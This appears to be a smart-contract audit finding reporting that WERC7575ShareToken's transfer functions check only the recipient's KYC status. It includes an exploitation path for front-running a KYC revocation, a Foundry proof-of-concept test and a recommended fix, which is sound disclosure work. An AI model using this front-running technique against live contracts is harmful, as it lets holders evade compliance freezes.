## Title
KYC Enforcement Bypass via Front-Running: Transfer Functions Missing Sender KYC Verification

## Summary
The `transfer()` and `transferFrom()` functions in WERC7575ShareToken only verify the recipient's KYC status, not the sender's. This allows users whose KYC is being revoked to front-run the `setKycVerified(user, false)` transaction by transferring all tokens to another KYC-verified address they control, completely bypassing KYC enforcement.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/WERC7575ShareToken.sol` - `transfer()` function (lines 472-477) and `transferFrom()` function (lines 488-492)

**Intended Logic:** Per the protocol's documented invariant #5 "KYC Gating: Only KYC-verified addresses can receive/hold shares", the system should prevent non-KYC-verified users from holding or transferring tokens. KYC revocation via `setKycVerified(user, false)` should effectively freeze that user's ability to move their tokens.

**Actual Logic:** The transfer functions only check the recipient's KYC status, allowing users with revoked (or about-to-be-revoked) KYC status to freely transfer tokens away. [1](#0-0) [2](#0-1) 

**Exploitation Path:**
1. User Alice holds 1,000 tokens with `isKycVerified[alice] = true`
2. Alice controls second address Bob with `isKycVerified[bob] = true`
3. KYC Admin submits transaction: `setKycVerified(alice, false)` to revoke Alice's KYC
4. Alice observes this transaction in the mempool
5. Alice front-runs with higher gas: `transfer(bob, 1000e18)`
6. The `transfer()` function executes line 474: `if (!isKycVerified[to]) revert KycRequired();` - checks only Bob (recipient), which passes
7. Tokens transfer successfully to Bob before KYC revocation takes effect
8. KYC Admin's transaction executes: `isKycVerified[alice] = false`
9. Alice's address now has 0 balance, making the KYC revocation meaningless
10. Bob (controlled by Alice) retains all 1,000 tokens with active KYC status

**Security Property Broken:** Violates Critical Invariant #5: "KYC Gating: Only KYC-verified addresses can receive/hold shares"

**Evidence of Inconsistency:** The `burn()` function correctly checks the sender's KYC status: [3](#0-2) 

This shows that checking the sender's KYC status is the intended behavior for token-removal operations, but this check is missing from `transfer()` and `transferFrom()`.

## Impact Explanation
- **Affected Assets**: All share tokens across all vaults in the multi-asset system
- **Damage Severity**: Complete bypass of regulatory compliance mechanism. Users who should have frozen assets can move unlimited amounts to alternate addresses
- **User Impact**: Any user whose KYC is being revoked can circumvent enforcement. This undermines the entire compliance framework and exposes the protocol to regulatory liability

## Likelihood Explanation
- **Attacker Profile**: Any user with KYC-verified status who anticipates KYC revocation
- **Preconditions**: 
  - User must have token balance
  - User must control at least one other KYC-verified address
  - User must observe KYC revocation transaction in mempool (public blockchain)
- **Execution Complexity**: Single transaction with higher gas price to front-run. Trivially executable by any user with basic blockchain knowledge
- **Frequency**: Can be exploited every time KYC is revoked, which is a routine compliance operation

## Recommendation

Add sender KYC verification to both transfer functions:

```solidity
// In src/WERC7575ShareToken.sol, function transfer(), line 472-477:

// CURRENT (vulnerable):
function transfer(address to, uint256 value) public override whenNotPaused returns (bool) {
    address from = msg.sender;
    if (!isKycVerified[to]) revert KycRequired();
    _spendAllowance(from, from, value);
    return super.transfer(to, value);
}

// FIXED:
function transfer(address to, uint256 value) public override whenNotPaused returns (bool) {
    address from = msg.sender;
    if (!isKycVerified[from]) revert KycRequired(); // Check sender KYC
    if (!isKycVerified[to]) revert KycRequired();   // Check recipient KYC
    _spendAllowance(from, from, value);
    return super.transfer(to, value);
}

// In src/WERC7575ShareToken.sol, function transferFrom(), line 488-492:

// CURRENT (vulnerable):
function transferFrom(address from, address to, uint256 value) public override whenNotPaused returns (bool) {
    if (!isKycVerified[to]) revert KycRequired();
    _spendAllowance(from, from, value);
    return super.transferFrom(from, to, value);
}

// FIXED:
function transferFrom(address from, address to, uint256 value) public override whenNotPaused returns (bool) {
    if (!isKycVerified[from]) revert KycRequired(); // Check sender KYC
    if (!isKycVerified[to]) revert KycRequired();   // Check recipient KYC
    _spendAllowance(from, from, value);
    return super.transferFrom(from, to, value);
}
```

This aligns the transfer functions with the `burn()` function's pattern and ensures both parties in any token movement are KYC-verified.

## Proof of Concept

```solidity
// File: test/Exploit_KYCFrontrunning.t.sol
// Run with: forge test --match-test test_KYCFrontrunning -vvv

pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/WERC7575Vault.sol";
import "./MockAsset.sol";

contract Exploit_KYCFrontrunning is Test {
    WERC7575ShareToken public shareToken;
    WERC7575Vault public vault;
    MockAsset public asset;
    
    address owner = address(1);
    address alice = address(2);  // User whose KYC will be revoked
    address bob = address(3);    // Alice's alternate address
    
    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy contracts
        asset = new MockAsset();
        shareToken = new WERC7575ShareToken("Share Token", "SHARE");
        vault = new WERC7575Vault(address(asset), shareToken);
        
        // Setup roles
        shareToken.setValidator(owner);
        shareToken.setKycAdmin(owner);
        shareToken.registerVault(address(asset), address(vault));
        
        // Setup initial state: Alice and Bob both KYC-verified
        shareToken.setKycVerified(alice, true);
        shareToken.setKycVerified(bob, true);
        
        // Mint assets and approve
        asset.mint(alice, 10000e18);
        vm.stopPrank();
        
        // Alice deposits to get shares
        vm.startPrank(alice);
        asset.approve(address(vault), 10000e18);
        vault.deposit(1000e18, alice);
        vm.stopPrank();
    }
    
    function test_KYCFrontrunning() public {
        // SETUP: Initial state
        uint256 aliceInitialBalance = shareToken.balanceOf(alice);
        assertEq(aliceInitialBalance, 1000e18, "Alice should have 1000 shares");
        assertEq(shareToken.balanceOf(bob), 0, "Bob should have 0 shares");
        assertTrue(shareToken.isKycVerified(alice), "Alice should be KYC-verified");
        assertTrue(shareToken.isKycVerified(bob), "Bob should be KYC-verified");
        
        // EXPLOIT STEP 1: KYC Admin submits transaction to revoke Alice's KYC
        // (In real scenario, this would be in mempool, observable by Alice)
        
        // EXPLOIT STEP 2: Alice front-runs by transferring all tokens to Bob
        // First, Alice needs self-allowance via permit
        vm.prank(owner); // Validator signs permit
        shareToken.permit(alice, alice, 1000e18, block.timestamp + 1 hours, 0, "", "");
        
        // Alice transfers all tokens to Bob BEFORE KYC revocation
        vm.prank(alice);
        shareToken.transfer(bob, 1000e18);
        
        // EXPLOIT STEP 3: KYC revocation transaction executes (after front-run)
        vm.prank(owner);
        shareToken.setKycVerified(alice, false);
        
        // VERIFY: Exploit success
        assertEq(shareToken.balanceOf(alice), 0, "Alice has moved all tokens");
        assertEq(shareToken.balanceOf(bob), 1000e18, "Bob received all tokens");
        assertFalse(shareToken.isKycVerified(alice), "Alice KYC is revoked");
        assertTrue(shareToken.isKycVerified(bob), "Bob still KYC-verified");
        
        // IMPACT DEMONSTRATION: Alice successfully bypassed KYC enforcement
        // Bob (controlled by Alice) can continue using the tokens normally
        vm.prank(owner);
        shareToken.permit(bob, bob, 1000e18, block.timestamp + 1 hours, 0, "", "");
        
        vm.prank(bob);
        vault.redeem(500e18, bob, bob);
        
        assertEq(shareToken.balanceOf(bob), 500e18, 
            "Vulnerability confirmed: Alice bypassed KYC revocation by moving tokens to alternate address");
    }
}
```

## Notes

This vulnerability represents a fundamental flaw in the KYC enforcement mechanism. The protocol's documentation states "Only KYC-verified addresses can receive/hold shares" but the implementation only enforces the "receive" part, not the "hold" part. 

The inconsistency with the `burn()` function (which correctly checks sender KYC status) suggests this is an implementation oversight rather than intentional design. The fix is straightforward and aligns all token movement functions with consistent KYC enforcement.

The vulnerability is particularly severe because:
1. Front-running is trivial on public blockchains
2. KYC revocation is a routine compliance operation, not rare
3. The bypass is complete - no partial mitigation exists
4. It undermines the entire regulatory compliance framework

### Citations

**File:** src/WERC7575ShareToken.sol (L376-382)
```text
    function burn(address from, uint256 amount) external onlyVaults whenNotPaused {
        if (from == address(0)) {
            revert IERC20Errors.ERC20InvalidSender(address(0));
        }
        if (!isKycVerified[from]) revert KycRequired();
        _burn(from, amount);
    }
```

**File:** src/WERC7575ShareToken.sol (L472-477)
```text
    function transfer(address to, uint256 value) public override whenNotPaused returns (bool) {
        address from = msg.sender;
        if (!isKycVerified[to]) revert KycRequired();
        _spendAllowance(from, from, value);
        return super.transfer(to, value);
    }
```

**File:** src/WERC7575ShareToken.sol (L488-492)
```text
    function transferFrom(address from, address to, uint256 value) public override whenNotPaused returns (bool) {
        if (!isKycVerified[to]) revert KycRequired();
        _spendAllowance(from, from, value);
        return super.transferFrom(from, to, value);
    }
```
